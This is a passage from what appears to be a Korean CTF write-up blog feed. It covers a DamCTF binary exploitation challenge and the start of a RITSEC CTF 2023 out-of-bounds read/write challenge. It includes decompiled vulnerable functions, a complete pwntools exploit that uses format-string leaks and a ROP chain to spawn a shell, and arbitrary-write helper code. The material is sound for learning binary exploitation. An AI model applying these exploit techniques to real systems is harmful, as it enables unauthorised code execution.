class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">add_movie</span><span class="params">(<span class="type">void</span> *fsb)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter your movie link here and I&#x27;ll add it to the list&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, fsb, <span class="number">0x12C</span>uLL);</span><br><span class="line">  result = <span class="built_in">strstr</span>((<span class="type">const</span> <span class="type">char</span> *)fsb, <span class="string">&quot;%n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>n</code>이 필터링되어 있어서 <code>p</code>를 사용해서 주소 leak만 할 수 있다.</p><p>한편, 4번 메뉴에선 BOF가 발생하는데 버퍼의 위치가 아래와 같아서 정말 아슬하게 오버플로우가 발생한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf[32]; // [rsp+130h] [rbp-20h] BYREF</span><br></pre></td></tr></table></figure><p>대신 <code>review</code> 함수를 보면 아주 넉넉하게 변수에다가 입력을 받고 있으므로 여기다가 payload를 저장시켜 놓고 흐름을 바꾸면 될 것 같다!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">review</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">1008</span>]; <span class="comment">// [rsp+0h] [rbp-430h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+3F0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is the name of the book/movie you would like to review?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">59uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Okay, write your review below:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">1000uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thanks! I&#x27;ll make sure to take note of this review.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>captital 질문 맞추기</li><li><code>add_movie</code> 함수와 <code>watch_movie</code> 함수를 통해 FSB를 이용하여 leak stack, libc address</li><li><code>review</code> 함수를 통해 <code>system</code> 함수 실행하는 rop payload 입력</li><li>4번 메뉴를 통해 흐름을 rop payload가 저장된 스택으로 변경</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall-p&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chals.damctf.xyz&#x27;</span>, <span class="number">30888</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;capital of &#x27;</span>)</span><br><span class="line">    country = p.recvline()</span><br><span class="line">    country = country[:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if country == b&#x27;aaaa&#x27;:</span></span><br><span class="line">    <span class="comment">#     p.sendline(b&#x27;bbbb&#x27;)</span></span><br><span class="line">    <span class="comment"># if country == b&#x27;cccc&#x27;:</span></span><br><span class="line">    <span class="comment">#     p.sendline(b&#x27;dddd&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Italy&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Rome&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Australia&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Canberra&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Ireland&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Dublin&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Jordan&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Amman&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Sweden&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Stockholm&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;India&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Delhi&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Egypt&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Cairo&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Tanzania&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Dodoma&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Lebanon&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Beirut&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Kenya&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Nairobi&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Denmark&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Copenhagen&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">b&#x27;Peru&#x27;</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;Lima&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    text = p.recvline()</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Incorrect.&#x27;</span> <span class="keyword">in</span> text:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall-p&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;chals.damctf.xyz&#x27;</span>, <span class="number">30888</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack : &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x580</span></span><br><span class="line">info(<span class="string">&#x27;pie : &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>)) <span class="comment"># write fsb payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;list\n&#x27;</span>, <span class="string">b&#x27;%45$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>)) <span class="comment"># trigger fsb</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Icx4xul9LEE\n&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>], <span class="number">16</span>) -<span class="number">0x5902a</span>  - <span class="number">0x28000</span></span><br><span class="line">info(<span class="string">&#x27;libc : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># put payload</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(libc.address + <span class="number">0x2a3e5</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libc.address + <span class="number">0x29cd6</span>) <span class="comment"># ret</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;review?\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;below:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># control rip</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;4. Exit\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x440</span>) <span class="comment"># rbp</span></span><br><span class="line">payload += p64(libc.address + <span class="number">0x562ec</span>) <span class="comment"># leave ret</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;records?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dam&#123;my_f4v0r173_15_bl4d3_runn3r_b1n6b0n6&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - Alphabet (oob read, write)</title>
      <link href="/230412-ritsecctf2023-3Alphabet/"/>
      <url>/230412-ritsecctf2023-3Alphabet/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>This new protocol let’s you update the official English alphabet in real time! Easy as A#_<br><code>nc alphabet.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[21 solves &#x2F; 500 points]</li></ul><p>웬만한 씨텝은 취약점 찾는 것보다 익스가 훨씬 더 어려운 것 같다.. ㅠㅠ 이 문제가 근래 풀어본 문제 중에 익스가 가장 힘들고 어려웠다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>먼저 <code>main</code> 함수이다.</p><p>참고로 seccomp이 있어서 확인해야 한다. 대충 <code>flag.txt orw</code>해야하고 <code>mprotect</code> 함수가 허용되어 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  seccomp_rules();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="title function_">puts</span><span class="params">(<span class="string">&quot;Running very important code and threads&quot;</span>)</span>;</span><br><span class="line">    <span class="keyword">while</span> ( !fgets(buf, <span class="number">0x2D</span>, <span class="built_in">stdin</span>) );         <span class="comment">// fgets@got -&gt; gets</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt; <span class="number">44</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = i;</span><br><span class="line">LABEL_8:</span><br><span class="line">    buf[v3] = <span class="number">0</span>;</span><br><span class="line">    use_packet(buf, v3);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Scrambled alphabet sent&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>주석은 익스와 관련된건데.. 일단 무시하고 코드 분석을 해보자. <code>fgets</code> 함수로 0x2D 크기만큼 <code>buf</code>에 입력을 받아서 오버플로우는 일어나지 않는다. <code>\n</code>이 오면 <code>break</code>하고 입력한 size와 함께 <code>use_packet</code> 함수를 실행한다. size가 44보다 크면 <code>v3</code> 변수가 정의되지 않으니 조심하자. 익스할 때 <code>fgets@got</code>를 <code>gets</code>함수로 덮었었는데 <code>v3</code> 변수가 정의되지 않아 익스 코드에서 억지로 정의해줬다.</p><p><code>use_packet</code> 함수를 살펴보자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">use_packet</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 idx1; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 idx2; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Using packet&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">17</span> &amp;&amp; *buf == <span class="string">&#x27;Z&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="number">8</span> &amp;&amp; calc_checksum(buf, len) == buf[len - <span class="number">1</span>] )<span class="comment">// 마지막 바이트 검사</span></span><br><span class="line">  &#123;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(buf[<span class="number">1</span>]);</span><br><span class="line">    idx1 = *(buf + <span class="number">2</span>);</span><br><span class="line">    idx2 = *(buf + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( idx1 &lt;= <span class="number">18</span> &amp;&amp; idx2 &lt;= <span class="number">18</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = qword_404088;</span><br><span class="line">      *(buf + <span class="number">0x12</span>) = global_alphabet;</span><br><span class="line">      *(buf + <span class="number">26</span>) = v2;</span><br><span class="line">      <span class="built_in">strcpy</span>(buf + <span class="number">34</span>, <span class="string">&quot;qrstuvwxyz&quot;</span>);</span><br><span class="line">      *ptr = *&amp;buf[idx1 + <span class="number">18</span>];                  <span class="comment">// oob read</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Grabbed new alphabet characters: %s\n&quot;</span>, ptr);</span><br><span class="line">      *&amp;buf[idx2 + <span class="number">18</span>] = *ptr;                  <span class="comment">// oob write</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Placed new letters into alphabet&quot;</span>);</span><br><span class="line">      v3 = *(buf + <span class="number">26</span>);</span><br><span class="line">      global_alphabet = *(buf + <span class="number">18</span>);            <span class="comment">// bss 영역에 데이터 쓰기 가능</span></span><br><span class="line">      qword_404088 = v3;</span><br><span class="line">      qword_404090 = *(buf + <span class="number">34</span>);</span><br><span class="line">      word_404098 = *(buf + <span class="number">21</span>);</span><br><span class="line">      byte_40409A = buf[<span class="number">44</span>];</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Updated the alphabet&quot;</span>);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;An index is too big&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;                                               <span class="comment">// ___stack_chk_fail@got -&gt; ret</span></span><br></pre></td></tr></table></figure><p>처음 if문으로 이것저것 검사한다. 입력값의 첫 글자는 <code>Z</code>여야 한다. 두 번째 글자는 <code>\x08</code>이어야 한다. 그리고 <code>calc_checksum</code> 함수로 입력값의 마지막 글자를 검사하고 있다. 익스 코드 짤 때 python으로 <code>calc_checksum</code> 함수를 구현해서 마지막 글자 한 바이트를 넣어주자. 그 다음 글자는 <code>buf</code>의 index로 사용하고 있고, 마지막에는 <code>bss</code> 영역에 값을 복사해주고 있다. payload를 보내야하는 형식은 아래와 같다. (구조체 정리)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(idx1, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(idx2, signed=<span class="literal">True</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br></pre></td></tr></table></figure><p><code>idx1</code>과 <code>idx2</code> 크기 제한을 하고 있는데, 음수는 제한하지 않아 oob를 의심할 수 있다. (그래서 위의 구현에서 <code>signed=True</code>를 사용했다.)</p><p>이제 취약점을 찾아보자. <code>*ptr = *&amp;buf[idx1 + 18];</code> 이 라인으로 <code>*ptr</code>을 정의해주는데 바로 아래 줄에서 <code>printf</code>로 <code>ptr</code>을 출력해주기 때문에 스택에 있는 주소를 leak할 수 있다.(oob read) 그리고 <code>*&amp;buf[idx2 + 18] = *ptr;</code> 이 라인을 통해 oob write가 발생할 수 있다. 자. 이 두 취약점이 발생할 수 있는 이유는 <code>idx1</code>와 <code>idx2</code>가 우리의 입력값이고, 이 입력값 인덱스를 검증하지 않아서 <code>buf</code>에서 벗어난 곳에 접근할 수 있기 때문이다. </p><p>oob write는 익스할 때 아래처럼 구현해서 사용했다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18 = addr</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawb는 한 바이트씩 썼지만 aaw는 aawb를 호출해서 8바이트를 쓸 것</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*ptr = *&amp;buf[idx1 + <span class="number">18</span>];</span><br><span class="line">*&amp;buf[idx2 + <span class="number">18</span>] = *ptr;  </span><br></pre></td></tr></table></figure><p>입력값이 <code>idx2</code>니까 <code>payload</code>에서 <code>idx2</code>에 들어갈 부분은 <code>ptr - buf - 18</code>이다. 위의 내가 만든 python 함수 <code>aawb</code>에서는 <code>ptr</code>을 <code>addr</code>로 지정했다. 이 위치에 들어갈 값은 <code>idx1</code>에 따라 결정되는데 이것은 <code>libc</code>에서 <code>/bin/sh</code> 문자열을 찾는 것처럼 <code>next(libc.search(bytes([val])) - buf - 18</code>로 작성해주었다. <code>- buf - 18</code>을 해준 이유는 <code>idx2</code>에 들어갈 값을 찾는 것과 동일한 원리이다. 참고로 <code>next(libc.search(bytes([val]))</code>은 <code>libc</code>에서 <code>val</code> 값을 찾는 것인데, <code>val</code>은 한 바이트이다. </p><p>왜 한 바이트씩 찾아서 값을 써줄까? 만약 <code>x 주소</code>에 <code>0x41424344</code>이라는 값을 쓰고 싶다고 하자. 이를 위해서 <code>0x41424344이 저장된 주소</code>를 찾아야 한다. 하지만 저 값이 저장된 주소는 찾기가 힘들 수도 있다. 그래서 한 바이트씩 찾아 써주는 것이다. 전체 값을 쓰기 위해서 <code>aaw</code>라는 함수를 정의했고 쓰고 싶은 값 길이만큼 <code>aawb</code>를 호출해서 값을 쓴다. </p><p>문제에서 <code>while(1)</code>로 입력값을 계속 쓸 수 있어서 이와 같은 발상이 가능했다.</p><p>마지막으로 우리가 python으로 구현해야할 <code>calc_checksum</code>이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title 